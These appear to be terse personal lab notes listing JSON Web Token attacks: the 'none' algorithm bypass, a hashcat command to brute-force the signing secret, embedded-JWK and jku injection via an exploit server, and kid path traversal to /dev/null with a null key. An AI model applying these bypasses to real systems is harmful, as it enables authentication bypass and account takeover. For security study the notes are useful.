Check Unverify Token
Change alg > none
bruteforce
```
hashcat -a 0 -m 16500 jwt wordlist
```
if jwk > JWT Editor > new RSA > attack embedded JWK
jku >> new RSA > exploit server > copy Public JWK > chang kid JWT > add jku > sign > Don't modify
```emptyJWK
{ "keys": [ ] }
```

**Bypass Kid to pathtraversal
new sym key > k value > base64(null) "AA==" > kid ../../../dev/null